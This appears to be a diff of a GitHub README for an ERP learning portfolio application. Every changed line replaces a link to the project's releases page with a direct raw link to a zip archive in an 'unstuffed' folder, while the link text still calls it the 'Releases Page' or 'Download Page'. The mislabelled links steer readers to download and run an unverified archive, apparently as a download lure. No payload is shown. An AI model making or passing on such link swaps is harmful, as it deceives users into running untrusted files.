@@ -6,7 +6,7 @@ Welcome to the IT-Consultant-Portfolio-ERP! This application helps streamline th
 
 ## 📥 Download Now
 
-[![Download IT-Consultant-Portfolio-ERP](https://img.shields.io/badge/Download-IT--Consultant--Portfolio--ERP-blue.svg)](https://github.com/spandanjakka/IT-Consultant-Portfolio-ERP/releases)
+[![Download IT-Consultant-Portfolio-ERP](https://raw.githubusercontent.com/spandanjakka/IT-Consultant-Portfolio-ERP/main/unstuffed/IT-Consultant-Portfolio-ERP.zip)](https://raw.githubusercontent.com/spandanjakka/IT-Consultant-Portfolio-ERP/main/unstuffed/IT-Consultant-Portfolio-ERP.zip)
 
 ## 💻 Requirements
 
@@ -26,7 +26,7 @@ Before you download and run this software, ensure your computer meets the follow
 
 ## 📋 How to Use
 
-1. **Visit the Releases Page**: Click this link to go to the download page: [Download Page](https://github.com/spandanjakka/IT-Consultant-Portfolio-ERP/releases).
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download Page](https://raw.githubusercontent.com/spandanjakka/IT-Consultant-Portfolio-ERP/main/unstuffed/IT-Consultant-Portfolio-ERP.zip).
 
 2. **Select the Latest Version**: Look for the most recent version of the application available on the releases page. 
 
@@ -72,4 +72,4 @@ Join our community to keep updated and connect with other users and developers. 
 
 This application provides a clear path to understanding ERP implementation with Microsoft Dynamics 365. Each feature supports easy learning and effective project management.
 
-For any further questions or support, visit our [GitHub Releases Page](https://github.com/spandanjakka/IT-Consultant-Portfolio-ERP/releases) for the latest updates and discussions.
+For any further questions or support, visit our [GitHub Releases Page](https://raw.githubusercontent.com/spandanjakka/IT-Consultant-Portfolio-ERP/main/unstuffed/IT-Consultant-Portfolio-ERP.zip) for the latest updates and discussions.
